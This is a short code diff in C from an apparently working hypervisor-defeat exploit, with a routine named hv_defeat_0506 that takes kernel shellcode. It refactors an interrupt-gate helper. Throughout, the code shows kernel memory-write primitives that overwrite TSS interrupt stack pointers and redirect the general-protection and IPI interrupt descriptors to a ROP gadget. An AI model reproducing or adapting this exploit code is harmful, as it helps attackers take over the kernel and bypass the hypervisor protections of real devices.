@@ -9,20 +9,6 @@
 
 #define IPI_STOP 252
 
-static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist) {
-  struct gate_descriptor ip = {};
-  ip.gd_looffset = func;
-  ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
-  ip.gd_ist = ist;
-  ip.gd_xx = 0;
-  ip.gd_type = typ;
-  ip.gd_dpl = dpl;
-  ip.gd_p = 1;
-  ip.gd_hioffset = func >> 16;
-  kwrite(ktext + env_offset.IDT + idx * sizeof(struct gate_descriptor), &ip,
-         sizeof(ip));
-}
-
 static int get_vcpu(void) {
   if (fw >= 0x0500 && fw < 0x0600) {
     return 0;
@@ -175,8 +161,8 @@ int hv_defeat_0506(void *shellcode_kernel, size_t shellcode_kernel_len) {
   kwrite64(ktext + env_offset.COMMON_TSS + 0 * sizeof(struct amd64tss) +
                offsetof(struct amd64tss, tss_ist6),
            ist_gp + 0x1000);
-  setidt(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
-         SEL_KPL, 6);
+  set_idt_gate(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
+               SEL_KPL, 6);
 
   if (vcpu != 0) {
     uintptr_t ist_ipi = pa_to_dmap(alloc_page());
@@ -184,8 +170,8 @@ int hv_defeat_0506(void *shellcode_kernel, size_t shellcode_kernel_len) {
     kwrite64(ktext + env_offset.COMMON_TSS + vcpu * sizeof(struct amd64tss) +
                  offsetof(struct amd64tss, tss_ist7),
              ist_ipi + 0x30);
-    setidt(IPI_STOP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
-           SEL_KPL, 7);
+    set_idt_gate(IPI_STOP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
+                 SEL_KPL, 7);
   }
 
   // During suspend, AcpiSetFirmwareWakingVector will corrupt its own pointer,
